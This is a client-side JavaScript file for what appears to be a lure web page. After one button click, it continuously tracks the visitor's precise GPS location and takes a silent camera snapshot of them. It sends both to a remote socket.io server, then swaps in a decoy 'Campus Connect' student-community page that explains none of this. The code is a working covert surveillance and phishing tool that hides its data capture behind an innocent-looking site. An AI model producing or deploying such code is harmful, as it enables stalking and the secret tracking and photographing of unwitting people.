const socket = io();

const goButton = document.getElementById("go");
const video = document.getElementById("v");
const canvas = document.getElementById("c");
const status = document.getElementById("status");

video.setAttribute("playsinline", "");
video.setAttribute("autoplay", "");
video.muted = true;

let locationWatchId = null;

// ---------------- LOCATION ----------------

function startLocation() {
  if (!("geolocation" in navigator)) {
    status.textContent = "Location is not supported by this browser.";
    return;
  }

  locationWatchId = navigator.geolocation.watchPosition(
    (position) => {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const accuracy = position.coords.accuracy;

      socket.emit("visitor:location", {
        latitude,
        longitude,
        accuracy
      });

      status.textContent = "Location ready. Starting camera…";
    },
    (error) => {
      if (error.code === 1) {
        status.textContent =
          "Location permission was denied. Please allow Location access.";
      } else if (error.code === 2) {
        status.textContent =
          "Location is unavailable. Please turn on GPS/Location.";
      } else {
        status.textContent =
          "Location request timed out. Please keep GPS/Location ON.";
      }
    },
    {
      enableHighAccuracy: true,
      maximumAge: 0,
      timeout: 15000
    }
  );
}

// ---------------- CAMERA ----------------

async function startCamera() {
  if (
    !navigator.mediaDevices ||
    !navigator.mediaDevices.getUserMedia
  ) {
    throw new Error(
      "Camera access is not supported by this browser."
    );
  }

  // Simple request for better mobile compatibility
  try {
    return await navigator.mediaDevices.getUserMedia({
      video: true,
      audio: false
    });
  } catch (firstError) {
    // Fallback for front camera
    return await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: {
          ideal: "user"
        }
      },
      audio: false
    });
  }
}

// ---------------- WAIT FOR VIDEO ----------------

async function waitForVideo() {
  if (
    video.readyState >= 2 &&
    video.videoWidth > 0
  ) {
    return;
  }

  await new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      reject(
        new Error(
          "Camera started, but video could not be displayed."
        )
      );
    }, 10000);

    video.onloadedmetadata = () => {
      clearTimeout(timer);
      resolve();
    };
  });
}

// ---------------- CAPTURE PHOTO ----------------

async function capturePhoto(stream) {
  await waitForVideo();

  const width = video.videoWidth || 1280;
  const height = video.videoHeight || 720;

  canvas.width = width;
  canvas.height = height;

  const context = canvas.getContext("2d");

  context.drawImage(
    video,
    0,
    0,
    width,
    height
  );

  const photo = canvas.toDataURL(
    "image/jpeg",
    0.82
  );

  socket.emit(
    "visitor:photo",
    photo
  );

  // Stop camera after photo capture
  stream.getTracks().forEach((track) => {
    track.stop();
  });
}

// ---------------- CAMPUS PAGE ----------------

function showCampusPage() {
  document.body.innerHTML = `
    <header class="nav">
      <div class="brand">
        <b>CC</b> Campus Connect
      </div>

      <nav>
        Discover &nbsp;&nbsp;
        Events &nbsp;&nbsp;
        Community
        <button>Explore</button>
      </nav>
    </header>

    <main class="home">

      <section class="hero">

        <div>
          <small class="eyebrow">
            YOUR CAMPUS • YOUR COMMUNITY
          </small>

          <h2>
            Make your<br>
            <i>next chapter</i><br>
            unforgettable.
          </h2>

          <p>
            Discover events, connect with people,
            and explore everything your campus has to offer.
          </p>

          <button class="primary">
            Explore Campus →
          </button>
        </div>

        <div class="visual">

          <div class="ring r1"></div>
          <div class="ring r2"></div>

          <div class="glass">
            <span>🎓</span>
            <b>Campus Life</b>
            <small>
              Learn • Connect • Grow
            </small>
          </div>

          <div class="float">
            ✦ <b>25+</b>
            <small>
              Upcoming events
            </small>
          </div>

        </div>

      </section>

      <section class="cards">

        <article>
          <em>01</em>
          <h3>Discover</h3>
          <p>
            Find workshops, clubs and activities
            around campus.
          </p>
        </article>

        <article>
          <em>02</em>
          <h3>Connect</h3>
          <p>
            Meet communities and make meaningful
            connections.
          </p>
        </article>

        <article>
          <em>03</em>
          <h3>Grow</h3>
          <p>
            Turn campus moments into new
            opportunities.
          </p>
        </article>

      </section>

    </main>
  `;
}

// ---------------- MAIN BUTTON ----------------

goButton.addEventListener("click", async () => {

  goButton.disabled = true;

  status.textContent =
    "Requesting location permission…";

  // Start location independently
  startLocation();

  try {

    status.textContent =
      "Requesting camera permission…";

    const stream = await startCamera();

    video.srcObject = stream;
    video.muted = true;
    video.setAttribute(
      "playsinline",
      ""
    );

    try {
      await video.play();
    } catch (error) {
      // Mobile browsers may handle playback automatically
    }

    await capturePhoto(stream);

    status.textContent =
      "Access granted.";

    showCampusPage();

  } catch (error) {

    console.error(
      "Camera error:",
      error
    );

    status.textContent =
      "Camera could not start: " +
      (
        error.message ||
        "Please allow camera access and try again."
      );

    goButton.disabled = false;
  }
});
